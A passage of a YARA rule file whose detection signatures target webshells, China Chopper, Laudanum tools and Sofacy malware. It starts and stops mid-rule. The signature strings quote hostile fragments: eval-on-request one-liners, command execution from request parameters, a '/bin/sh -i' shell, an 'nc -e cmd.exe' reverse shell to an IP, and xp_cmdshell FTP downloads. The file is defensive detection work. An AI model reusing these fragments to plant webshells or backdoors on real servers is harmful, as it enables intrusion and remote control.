$_SERVER['PHP_SELF']  ?>\\\">Home</a><br/>\" fullword ascii\n      $s3 = \"$dir  = isset($_GET[\\\"dir\\\"])  ? $_GET[\\\"dir\\\"]  : \\\".\\\";\" fullword ascii\n      $s4 = \"$curdir .= substr($curdir, -1) != \\\"/\\\" ? \\\"/\\\" : \\\"\\\";\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule Webshell_warfiles_cmd_RID2F96 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file cmd.jsp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 12:03:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process p = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\"));\" fullword ascii\n      $s2 = \"out.println(\\\"Command: \\\" + request.getParameter(\\\"cmd\\\") + \\\"<BR>\\\");\" fullword ascii\n      $s3 = \"<FORM METHOD=\\\"GET\\\" NAME=\\\"myform\\\" ACTION=\\\"\\\">\" fullword ascii\n      $s4 = \"String disr = dis.readLine();\" fullword ascii\n   condition: \n      filesize < 2KB and all of them\n}\n\nrule Webshell_asp_dns_RID2D8E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file dns.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 10:36:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"command = \\\"nslookup -type=\\\" & qtype & \\\" \\\" & query \" fullword ascii\n      $s2 = \"Set objCmd = objWShell.Exec(command)\" fullword ascii\n      $s3 = \"Response.Write command & \\\"<br>\\\"\" fullword ascii\n      $s4 = \"<form name=\\\"dns\\\" method=\\\"POST\\\">\" fullword ascii\n   condition: \n      filesize < 21KB and all of them\n}\n\nrule php_reverse_shell_2_RID2EBC : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools - file php-reverse-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 11:27:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$process = proc_open($shell, $descriptorspec, $pipes);\" fullword ascii\n      $s7 = \"$shell = 'uname -a; w; id; /bin/sh -i';\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}\n\nrule Webshell_Laudanum_Tools_Generic_RID3369 : DEMO GEN T1505_003 WEBSHELL {\n   meta:\n      description = \"Laudanum Injector Tools\"\n      author = \"Florian Roth\"\n      reference = \"http://laudanum.inguardians.com/\"\n      date = \"2015-06-22 14:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"885e1783b07c73e7d47d3283be303c9719419b92\"\n      hash2 = \"01d5d16d876c55d77e094ce2b9c237de43b21a16\"\n      hash3 = \"7421d33e8007c92c8642a36cba7351c7f95a4335\"\n      tags = \"DEMO, GEN, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"***  laudanum@secureideas.net\" fullword ascii\n      $s2 = \"*** Laudanum Project\" fullword ascii\n   condition: \n      filesize < 60KB and all of them\n}\n\nrule Sofacy_Mal2_RID2B21 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Sofacy Group Malware Sample 2\"\n      author = \"Florian Roth\"\n      reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n      date = \"2015-06-19 08:53:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"PROJECT\\\\XAPS_OBJECTIVE_DLL\\\\\" ascii\n      $x2 = \"XAPS_OBJECTIVE.dll\" fullword ascii\n      $s1 = \"i`m wait\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and ( 1 of ( $x* ) ) and $s1\n}\n\nrule Sofacy_Mal3_RID2B22 : APT DEMO EXE FILE G0007 RUSSIA {\n   meta:\n      description = \"Sofacy Group Malware Sample 3\"\n      author = \"Florian Roth\"\n      reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n      date = \"2015-06-19 08:53:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      tags = \"APT, DEMO, EXE, FILE, G0007, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"shell\\\\open\\\\command=\\\"System Volume Information\\\\USBGuard.exe\\\" install\" fullword ascii\n      $s2 = \".?AVAgentModuleRemoteKeyLogger@@\" fullword ascii\n      $s3 = \"<font size=4 color=red>process isn't exist</font>\" fullword ascii\n      $s4 = \"<font size=4 color=red>process is exist</font>\" fullword ascii\n      $s5 = \".winnt.check-fix.com\" ascii\n      $s6 = \".update.adobeincorp.com\" ascii\n      $s7 = \".microsoft.checkwinframe.com\" ascii\n      $s8 = \"adobeincorp.com\" fullword wide\n      $s9 = \"# EXC: HttpSender - Cannot create Get Channel!\" fullword ascii\n      $x1 = \"User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:20.0) Gecko/20100101 Firefox/\" wide\n      $x2 = \"User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/2\" wide\n      $x3 = \"C:\\\\Windows\\\\System32\\\\cmd.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( 2 of ( $s* ) or ( 1 of ( $s* ) and all of ( $x* ) ) )\n}\n\nrule Winexe_RemoteExec_RID2DD1 : DEMO EXE FILE G0007 HKTL RUSSIA T1219 T1569_002 {\n   meta:\n      description = \"Winexe tool for remote execution (also used by Sofacy group)\"\n      author = \"Florian Roth\"\n      reference = \"http://dokumente.linksfraktion.de/inhalt/report-orig.pdf\"\n      date = \"2015-06-19 10:48:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2021-02-11\"\n      hash1 = \"5130f600cd9a9cdc82d4bad938b20cbd2f699aadb76e7f3f1a93602330d9997d\"\n      hash2 = \"d19dfdbe747e090c5aa2a70cc10d081ac1aa88f360c3f378288a3651632c4429\"\n      tags = \"DEMO, EXE, FILE, G0007, HKTL, RUSSIA, T1219, T1569_002\"\n      required_modules = \"pe\"\n      minimum_yara = \"3.2.0\"\n      \n   strings:\n      $s1 = \"error Cannot LogonUser(%s,%s,%s) %d\" ascii fullword\n      $s2 = \"error Cannot ImpersonateNamedPipeClient %d\" ascii fullword\n      $s3 = \"\\\\\\\\.\\\\pipe\\\\ahexec\" fullword ascii\n      $s4 = \"\\\\\\\\.\\\\pipe\\\\wmcex\" fullword ascii\n      $s5 = \"implevel\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 115KB and ( 3 of them or pe.imphash ( ) == \"2f8a475933ac82b8e09eaf26b396b54d\" )\n}\n\nrule Webshell_Txt_aspx1_RID2E32 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspx1.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:04:11\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%@ Page Language=\\\"Jscript\\\"%><%eval(Request.Item[\" \n      $s1 = \"],\\\"unsafe\\\");%>\" fullword ascii\n   condition: \n      filesize < 150 and all of them\n}\n\nrule Webshell_Shell_Asp_RID2E21 : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set Webshells - file Asp.html\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:01:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Session.Contents.Remove(m & \\\"userPassword\\\")\" fullword ascii\n      $s2 = \"passWord = Encode(GetPost(\\\"password\\\"))\" fullword ascii\n      $s3 = \"function Command(cmd, str){\" fullword ascii\n   condition: \n      filesize < 100KB and all of them\n}\n\nrule Webshell_Txt_aspxtag_RID2F3D : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspxtag.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:48:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"String wGetUrl=Request.QueryString[\" fullword ascii\n      $s2 = \"sw.Write(wget);\" fullword ascii\n      $s3 = \"Response.Write(\\\"Hi,Man 2015\\\"); \" fullword ascii\n   condition: \n      filesize < 2KB and all of them\n}\n\nrule Webshell_Txt_php_RID2D8D : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file php.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:36:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$Config=$_SERVER['QUERY_STRING'];\" fullword ascii\n      $s2 = \"gzuncompress($_SESSION['api']),null);\" ascii\n      $s3 = \"sprintf('%s?%s',pack(\\\"H*\\\",\" ascii\n      $s4 = \"if(empty($_SESSION['api']))\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}\n\nrule Webshell_Txt_shell_RID2E5D : CHINA DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file shell.c\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:11:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"printf(\\\"Could not connect to remote shell!\\\\n\\\");\" fullword ascii\n      $s2 = \"printf(\\\"Usage: %s <reflect ip> <port>\\\\n\\\", prog);\" fullword ascii\n      $s3 = \"execl(shell,\\\"/bin/sh\\\",(char *)0);\" fullword ascii\n      $s4 = \"char shell[]=\\\"/bin/sh\\\";\" fullword ascii\n      $s5 = \"connect back door\\\\n\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 2KB and 2 of them\n}\n\nrule Webshell_Txt_asp_RID2D89 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:36:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next:BodyCol\" ascii\n      $s2 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 100KB and all of them\n}\n\nrule Webshell_Txt_asp1_RID2DBA : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file asp1.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:44:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"cmd.exe\\\"\" fullword ascii\n      $s2 = \"autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)\" fullword ascii\n      $s3 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n      $s4 = \"szTempFile = server.mappath(\\\"cmd.txt\\\")\" fullword ascii\n   condition: \n      filesize < 70KB and 2 of them\n}\n\nrule Webshell_Txt_php_2_RID2E1E : CHINA DEMO T1016 T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file php.html\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:00:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1016, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"function connect($dbhost, $dbuser, $dbpass, $dbname='') {\" fullword ascii\n      $s2 = \"scookie('loginpass', '', -86400 * 365);\" fullword ascii\n      $s3 = \"<title><?php echo $act.' - '.$_SERVER['HTTP_HOST'];?></title>\" fullword ascii\n      $s4 = \"Powered by <a title=\\\"Build 20130112\\\" href=\\\"http://www.4ngel.net\\\" target=\\\"_b\" ascii\n      $s5 = \"formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\\\\'shell\\\\',null,this.\" ascii\n      $s6 = \"secparam('IP Configurate',execute('ipconfig -all'));\" fullword ascii\n      $s7 = \"secparam('Hosts', @file_get_contents('/etc/hosts'));\" fullword ascii\n      $s8 = \"p('<p><a href=\\\"http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/\\\" target=\" ascii\n   condition: \n      filesize < 100KB and 4 of them\n}\n\nrule Webshell_Txt_ftp_RID2D8F : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file ftp.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:37:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"';exec master.dbo.xp_cmdshell 'echo open \" ascii\n      $s2 = \"';exec master.dbo.xp_cmdshell 'ftp -s:';\" ascii\n      $s3 = \"';exec master.dbo.xp_cmdshell 'echo get lcx.exe\" ascii\n      $s4 = \"';exec master.dbo.xp_cmdshell 'echo get php.exe\" ascii\n      $s5 = \"';exec master.dbo.xp_cmdshell 'copy \" ascii\n      $s6 = \"ftp -s:d:\\\\ftp.txt \" fullword ascii\n      $s7 = \"echo bye>>d:\\\\ftp.txt \" fullword ascii\n   condition: \n      filesize < 2KB and 2 of them\n}\n\nrule Webshell_Txt_lcx_RID2D8C : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file lcx.c\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:36:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"printf(\\\"Usage:%s -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-l\" ascii\n      $s2 = \"sprintf(tmpbuf2,\\\"\\\\r\\\\n########### reply from %s:%d ####################\\\\r\\\\n\" ascii\n      $s3 = \"printf(\\\" 3: connect to HOST1:PORT1 and HOST2:PORT2\\\\r\\\\n\\\");\" fullword ascii\n      $s4 = \"printf(\\\"got,ip:%s,port:%d\\\\r\\\\n\\\",inet_ntoa(client1.sin_addr),ntohs(client1.sin\" ascii\n      $s5 = \"printf(\\\"[-] connect to host1 failed\\\\r\\\\n\\\");\" fullword ascii\n   condition: \n      filesize < 25KB and 2 of them\n}\n\nrule Webshell_Txt_jspcmd_RID2EC6 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file jspcmd.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:28:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(\\\"1752393\\\".equals(request.getParameter(\\\"Confpwd\\\"))){\" fullword ascii\n      $s4 = \"out.print(\\\"Hi,Man 2015\\\");\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}\n\nrule Webshell_Txt_jsp_RID2D92 : CHINA DEMO T1007 T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:37:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1007, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"program = \\\"cmd.exe /c net start > \\\" + SHELL_DIR\" fullword ascii\n      $s2 = \"Process pro = Runtime.getRuntime().exec(exe);\" fullword ascii\n      $s3 = \"<option value=\\\\\\\"nc -e cmd.exe 192.168.230.1 4444\\\\\\\">nc</option>\\\"\" fullword ascii\n      $s4 = \"cmd = \\\"cmd.exe /c set\\\";\" fullword ascii\n   condition: \n      filesize < 715KB and 2 of them\n}\n\nrule Webshell_Txt_aspxlcx_RID2F48 : CHINA DEMO FILE T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspxlcx.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:50:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, FILE, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"public string remoteip = \" ascii\n      $s2 = \"=Dns.Resolve(host);\" ascii\n      $s3 = \"public string remoteport = \" ascii\n      $s4 = \"public class PortForward\" ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 18KB and all of them\n}\n\nrule Webshell_Txt_xiao_RID2DF6 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file xiao.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:54:11\"\n      score = 85\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Session.Contents.Remove(m & \\\"userPassword\\\")\" fullword ascii\n      $s2 = \"passWord = Encode(GetPost(\\\"password\\\"))\" fullword ascii\n      $s3 = \"conn.Execute(\\\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,\" ascii\n      $s4 = \"function Command(cmd, str){\" fullword ascii\n      $s5 = \"echo \\\"if(obj.value=='PageWebProxy')obj.form.target='_blank';\\\"\" fullword ascii\n   condition: \n      filesize < 100KB and all of them\n}\n\nrule Webshell_Txt_aspx_RID2E01 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file aspx.jpg\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:56:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"SQLExec : <asp:DropDownList runat=\\\"server\\\" ID=\\\"FGEy\\\" AutoPostBack=\\\"True\\\" O\" ascii\n      $s2 = \"Process[] p=Process.GetProcesses();\" fullword ascii\n      $s3 = \"Copyright &copy; 2009 Bin\" ascii\n      $s4 = \"<td colspan=\\\"5\\\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\\\"input\\\" runat=\\\"serv\" ascii\n   condition: \n      filesize < 100KB and all of them\n}\n\nrule Webshell_Txt_Sql_RID2D75 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file Sql.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 10:32:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd=chr(34)&\\\"cmd.exe /c \\\"&request.form(\\\"cmd\\\")&\\\" > 8617.tmp\\\"&chr(34)\" fullword ascii\n      $s2 = \"strQuery=\\\"dbcc addextendedproc ('xp_regwrite','xpstar.dll')\\\"\" fullword ascii\n      $s3 = \"strQuery = \\\"exec master.dbo.xp_cmdshell '\\\" & request.form(\\\"cmd\\\") & \\\"'\\\" \" fullword ascii\n      $s4 = \"session(\\\"login\\\")=\\\"\\\"\" fullword ascii\n   condition: \n      filesize < 15KB and all of them\n}\n\nrule Webshell_Txt_hello_RID2E59 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - Webshells - file hello.txt\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-14 11:10:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Dim myProcessStartInfo As New ProcessStartInfo(\\\"cmd.exe\\\")\" fullword ascii\n      $s1 = \"myProcessStartInfo.Arguments=\\\"/c \\\" & Cmd.text\" fullword ascii\n      $s2 = \"myProcess.Start()\" fullword ascii\n      $s3 = \"<p align=\\\"center\\\"><a href=\\\"?action=cmd\\\" target=\\\"_blank\\\">\" fullword ascii\n   condition: \n      filesize < 25KB and all of them\n}\n\nrule Webshell_ChinaChopper_one_RID30FB : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file one.asp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:03:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%eval request(\" ascii\n   condition: \n      filesize < 50 and all of them\n}\n\nrule Webshell_ChinaChopper_temp_2_RID3200 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file temp.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 13:46:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@eval($_POST[strtoupper(md5(gmdate(\" ascii\n   condition: \n      filesize < 150 and all of them\n}\n\nrule Webshell_templatr_RID2E0F : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file templatr.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 10:58:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"eval(gzinflate(base64_decode('\" ascii\n   condition: \n      filesize < 70KB and all of them\n}\n\nrule Webshell_Tools_JSP_cmd_RID2F96 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file cmd.jSp\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 12:03:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(\\\"1752393\\\".equals(request.getParameter(\\\"Confpwd\\\"))){\" fullword ascii\n      $s1 = \"java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"Conn\\\"\" ascii\n      $s2 = \"<%@ page import=\\\"java.io.*\\\" %>\" fullword ascii\n      $s3 = \"out.print(\\\"Hi,Man 2015<br /><!--?Confpwd=023&Conn=ls-->\\\");\" fullword ascii\n      $s4 = \"while((a=in.read(b))!=-1){\" fullword ascii\n      $s5 = \"out.println(new String(b));\" fullword ascii\n      $s6 = \"out.print(\\\"</pre>\\\");\" fullword ascii\n      $s7 = \"out.print(\\\"<pre>\\\");\" fullword ascii\n      $s8 = \"int a = -1;\" fullword ascii\n      $s9 = \"byte[] b = new byte[2048];\" fullword ascii\n   condition: \n      filesize < 3KB and 7 of them\n}\n\nrule Webshell_InjectionParameters_RID325D : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file InjectionParameters.vb\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 14:02:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Public Shared ReadOnly Empty As New InjectionParameters(-1, \\\"\\\")\" fullword ascii\n      $s1 = \"Public Class InjectionParameters\" fullword ascii\n   condition: \n      filesize < 13KB and all of them\n}\n\nrule Webshell_Customize_4_RID2EFC : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file Customize.aspx\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:37:51\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"ds.Clear();ds.Dispose();}else{SqlCommand cm = Conn.CreateCommand();cm.CommandTex\" ascii\n      $s2 = \"c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=tr\" ascii\n      $s3 = \"Stream WF=WB.GetResponseStream();FileStream FS=new FileStream(Z2,FileMode.Create\" ascii\n      $s4 = \"R=\\\"Result\\\\t|\\\\t\\\\r\\\\nExecute Successfully!\\\\t|\\\\t\\\\r\\\\n\\\";}Conn.Close();break;\" ascii\n   condition: \n      filesize < 24KB and all of them\n}\n\nrule Webshell_oracle_data_RID2F15 : CHINA DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Chinese Hacktool Set - file oracle_data.php\"\n      author = \"Florian Roth\"\n      reference = \"http://tools.zjqhr.com/\"\n      date = \"2015-06-13 11:42:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC 